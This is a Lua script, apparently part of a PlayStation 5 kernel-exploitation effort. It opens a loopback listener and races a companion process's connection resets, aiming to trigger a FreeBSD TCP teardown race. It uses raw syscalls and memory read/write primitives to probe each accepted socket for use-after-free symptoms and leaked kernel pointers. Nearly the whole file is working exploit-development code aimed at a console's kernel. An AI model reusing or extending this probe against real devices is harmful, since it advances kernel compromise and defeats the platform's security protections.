-- CRASH_CLASS: MODERATE
-- PROBE 52b-setup: Multi-process TCP race condition — listener/acceptor
--
-- THEORY: Two separate loader processes (two TCP connections to 9026) can
-- race on shared kernel TCP state. Process A (this script) listens on a
-- port. Process B (52b_race_worker.lua) rapidly connects and RST-closes.
-- The race window is between accept() returning a fd and the kernel
-- processing the RST that destroys the underlying TCB.
--
-- LAUNCH ORDER: Send this script FIRST, wait 2 seconds, then send
-- 52b_race_worker.lua on a SECOND TCP connection.
--
-- FreeBSD r230171 (2012) had known races in tcp_close/in_pcbfree/sofree.
-- The PS5's kernel may still have these if Sony didn't backport fixes.

print("=== PROBE 52b-SETUP: TCP RACE LISTENER ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Syscall wrappers
local sc_getpid = make_syscall(20)
local sc_socket = make_syscall(97)
local sc_bind = make_syscall(104)
local sc_listen = make_syscall(106)
local sc_accept = make_syscall(30)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_read = make_syscall(3)
local sc_write = make_syscall(4)
local sc_poll = make_syscall(209)
local sc_getsockname = make_syscall(32)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("PID: " .. pid)

-- Constants
local AF_INET = 2
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF
local SO_REUSEADDR = 0x0004
local SO_REUSEPORT = 0x0200
local SO_ERROR = 0x1007
local SO_TYPE = 0x1008
local TCP_INFO_OPT = 32
local IPPROTO_TCP = 6
local LISTEN_PORT = 31337
local INADDR_LOOPBACK = 0x0100007F  -- 127.0.0.1 in network byte order

-- Build sockaddr_in
local function build_sockaddr_in(port, addr_nbo)
    local sa = memory.alloc(16)
    -- sin_len=16, sin_family=AF_INET
    safe_wd(sa, 0x00020010)
    -- sin_port (network byte order) + sin_addr
    local port_nbo = bit32.bor(bit32.lshift(bit32.band(port, 0xFF), 8),
                               bit32.rshift(bit32.band(port, 0xFF00), 8))
    safe_wd(sa + 4, bit32.bor(bit32.lshift(addr_nbo, 16), port_nbo))
    -- Actually: offset 2 = port (2 bytes, NBO), offset 4 = addr (4 bytes, NBO)
    -- Let's be precise:
    safe_wd(sa, 0)
    memory.write_byte(sa, 16)       -- sin_len
    memory.write_byte(sa + 1, AF_INET) -- sin_family
    -- port in network byte order
    memory.write_byte(sa + 2, bit32.rshift(bit32.band(port, 0xFF00), 8))
    memory.write_byte(sa + 3, bit32.band(port, 0xFF))
    -- addr = 127.0.0.1 = 0x7F000001, NBO = 0x7F, 0x00, 0x00, 0x01
    memory.write_byte(sa + 4, 0x7F)
    memory.write_byte(sa + 5, 0x00)
    memory.write_byte(sa + 6, 0x00)
    memory.write_byte(sa + 7, 0x01)
    return sa
end

-- Helper: write an int to a buffer (for setsockopt val)
local function make_int_buf(val)
    local buf = memory.alloc(4)
    safe_wd(buf, val)
    return buf
end

print("[1] Creating listener socket...")
local listen_fd = -1
pcall(function()
    listen_fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
end)
print("  listen_fd = " .. listen_fd)
if listen_fd < 0 then
    print("FATAL: socket() failed")
    return
end

-- Set SO_REUSEADDR and SO_REUSEPORT for aggressive port recycling
print("[2] Setting socket options...")
local opt_buf = make_int_buf(1)
pcall(function()
    sc_setsockopt(uint64(listen_fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
        uint64(opt_buf), uint64(4))
end)
pcall(function()
    sc_setsockopt(uint64(listen_fd), uint64(SOL_SOCKET), uint64(SO_REUSEPORT),
        uint64(opt_buf), uint64(4))
end)
print("  SO_REUSEADDR + SO_REUSEPORT set")

print("[3] Binding to 127.0.0.1:" .. LISTEN_PORT .. "...")
local sa = build_sockaddr_in(LISTEN_PORT, INADDR_LOOPBACK)
local bind_ret = -999
pcall(function()
    bind_ret = to_num(sc_bind(uint64(listen_fd), uint64(sa), uint64(16)))
end)
print("  bind ret = " .. bind_ret)
if bind_ret ~= 0 then
    print("FATAL: bind() failed — trying port 31338")
    sa = build_sockaddr_in(31338, INADDR_LOOPBACK)
    pcall(function()
        bind_ret = to_num(sc_bind(uint64(listen_fd), uint64(sa), uint64(16)))
    end)
    print("  bind 31338 ret = " .. bind_ret)
    if bind_ret ~= 0 then
        print("FATAL: both ports failed")
        return
    end
    LISTEN_PORT = 31338
end

print("[4] Listening (backlog=128)...")
local listen_ret = -999
pcall(function()
    listen_ret = to_num(sc_listen(uint64(listen_fd), uint64(128)))
end)
print("  listen ret = " .. listen_ret)
if listen_ret ~= 0 then
    print("FATAL: listen() failed")
    return
end

print("")
print("=== LISTENER READY on 127.0.0.1:" .. LISTEN_PORT .. " ===")
print("=== Send 52b_race_worker.lua on another connection NOW ===")
print("")

-- Accept loop: accept connections as fast as possible, probe each for anomalies
local accept_count = 0
local anomaly_count = 0
local error_count = 0
local crash_count = 0

-- Allocate reusable buffers for getsockopt probing
local optval_buf = memory.alloc(256)
local optlen_buf = memory.alloc(4)
local peer_sa = memory.alloc(128)
local peer_len_buf = memory.alloc(4)

-- TCP_INFO buffer for deep inspection
local tcpinfo_buf = memory.alloc(256)
local tcpinfo_len = memory.alloc(4)

print("[5] Entering accept loop (500 iterations, ~15 seconds)...")
print("")

local start_iter = 0
local TOTAL_ITERS = 500

for i = 1, TOTAL_ITERS do
    -- Poll for readability first (with 100ms timeout to avoid blocking forever)
    local pollfd = memory.alloc(8)
    safe_wd(pollfd, listen_fd)       -- fd
    safe_wd(pollfd + 4, 0x0001)      -- events = POLLIN
    local poll_ret = -999
    pcall(function()
        poll_ret = to_num(sc_poll(uint64(pollfd), uint64(1), uint64(100)))
    end)

    if poll_ret <= 0 then
        -- No connection ready, keep looping
        if i % 100 == 0 then
            print("  [iter " .. i .. "] waiting for connections... (accepted=" .. accept_count .. ")")
        end
    else
        -- Accept the connection
        safe_wd(peer_len_buf, 128)
        local acc_fd = -1
        local acc_ok = pcall(function()
            acc_fd = to_num(sc_accept(uint64(listen_fd), uint64(peer_sa), uint64(peer_len_buf)))
        end)

        if not acc_ok or acc_fd < 0 then
            error_count = error_count + 1
            if error_count <= 5 then
                print("  [iter " .. i .. "] accept FAILED: fd=" .. acc_fd .. " ok=" .. tostring(acc_ok))
            end
        else
            accept_count = accept_count + 1

            -- === RACE WINDOW PROBING ===
            -- The worker is closing its end simultaneously. The kernel may be
            -- tearing down the TCB right now. Probe the accepted socket for
            -- signs of use-after-free or corrupted state.

            -- Probe 1: SO_ERROR — should be 0 for healthy socket, nonzero = anomaly
            safe_wd(optlen_buf, 4)
            safe_wd(optval_buf, 0xDEAD)
            local so_err = -999
            local p1_ok = pcall(function()
                sc_getsockopt(uint64(acc_fd), uint64(SOL_SOCKET), uint64(SO_ERROR),
                    uint64(optval_buf), uint64(optlen_buf))
                so_err = safe_rd(optval_buf) or -999
            end)

            -- Probe 2: TCP_INFO — 236 bytes of TCP state. Look for corrupted values.
            safe_wd(tcpinfo_len, 236)
            for j = 0, 232, 4 do safe_wd(tcpinfo_buf + j, 0) end
            local ti_ok = pcall(function()
                sc_getsockopt(uint64(acc_fd), uint64(IPPROTO_TCP), uint64(TCP_INFO_OPT),
                    uint64(tcpinfo_buf), uint64(tcpinfo_len))
            end)
            local ti_state = safe_rd(tcpinfo_buf) or -1      -- tcpi_state at offset 0
            local ti_rto = safe_rd(tcpinfo_buf + 8) or 0     -- tcpi_rto
            local ti_snd_mss = safe_rd(tcpinfo_buf + 16) or 0

            -- Probe 3: Read 1 byte — may hit freed buffer
            local read_buf = memory.alloc(4)
            safe_wd(read_buf, 0x41414141)
            local read_ret = -999
            local r_ok = pcall(function()
                read_ret = to_num(sc_read(uint64(acc_fd), uint64(read_buf), uint64(1)))
            end)

            -- Probe 4: getsockname on accepted fd — check for corrupted addresses
            safe_wd(peer_len_buf, 128)
            for j = 0, 124, 4 do safe_wd(peer_sa + j, 0) end
            local gsn_ok = pcall(function()
                sc_getsockname(uint64(acc_fd), uint64(peer_sa), uint64(peer_len_buf))
            end)
            local gsn_family = 0
            if gsn_ok then
                gsn_family = safe_rd(peer_sa) or 0
                gsn_family = bit32.band(bit32.rshift(gsn_family, 8), 0xFF)
            end

            -- Check for anomalies
            local anomaly = false
            local anomaly_desc = ""

            if so_err ~= 0 and so_err ~= 104 and so_err ~= 54 then
                -- 104=ECONNRESET, 54=ECONNRESET (different constant?)
                -- Anything else is suspicious
                anomaly = true
                anomaly_desc = anomaly_desc .. "SO_ERROR=" .. so_err .. " "
            end

            if ti_state ~= nil and ti_state > 11 and ti_state ~= 0 then
                -- TCP states are 0-11. >11 means corruption
                anomaly = true
                anomaly_desc = anomaly_desc .. "TCP_STATE=" .. ti_state .. " "
            end

            if ti_rto > 0x10000000 then
                -- RTO > 268 seconds is suspicious (freed memory pattern?)
                anomaly = true
                anomaly_desc = anomaly_desc .. "RTO=0x" .. string.format("%X", ti_rto) .. " "
            end

            if gsn_ok and gsn_family ~= AF_INET and gsn_family ~= 0 then
                anomaly = true
                anomaly_desc = anomaly_desc .. "FAMILY=" .. gsn_family .. " "
            end

            if not p1_ok then
                anomaly = true
                anomaly_desc = anomaly_desc .. "GETSOCKOPT_CRASH "
            end

            if not r_ok then
                crash_count = crash_count + 1
                anomaly = true
                anomaly_desc = anomaly_desc .. "READ_CRASH "
            end

            -- Scan TCP_INFO for kernel pointers (UAF could expose them)
            if ti_ok then
                for off = 0, 232, 8 do
                    local q = safe_rq(tcpinfo_buf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            anomaly = true
                            anomaly_desc = anomaly_desc .. string.format(
                                "KPTR@+%d=0x%X%08X ", off, h, l)
                        end
                    end
                end
            end

            if anomaly then
                anomaly_count = anomaly_count + 1
                print(string.format("  *** ANOMALY #%d [iter %d] fd=%d: %s",
                    anomaly_count, i, acc_fd, anomaly_desc))
            end

            -- Log every 50th connection for progress
            if accept_count % 50 == 0 then
                print(string.format("  [iter %d] accepted=%d anomalies=%d errors=%d state=%d so_err=%d",
                    i, accept_count, anomaly_count, error_count,
                    ti_state or -1, so_err))
            end

            -- Close the accepted fd
            pcall(function() sc_close(uint64(acc_fd)) end)
        end
    end
end

-- Clean up
pcall(function() sc_close(uint64(listen_fd)) end)

print("")
print("=== RACE SETUP RESULTS ===")
print("Total iterations: " .. TOTAL_ITERS)
print("Accepted connections: " .. accept_count)
print("Anomalies detected: " .. anomaly_count)
print("Accept errors: " .. error_count)
print("Read crashes: " .. crash_count)
print("")
if anomaly_count > 0 then
    print("*** ANOMALIES FOUND — review output above for kernel pointer leaks or state corruption ***")
else
    print("No anomalies detected in this run. Race window may need tighter timing.")
    print("Consider: reduce poll timeout, add more iterations, or try SO_LINGER variant.")
end
print("")
print("=== PROBE 52b-SETUP COMPLETE ===")
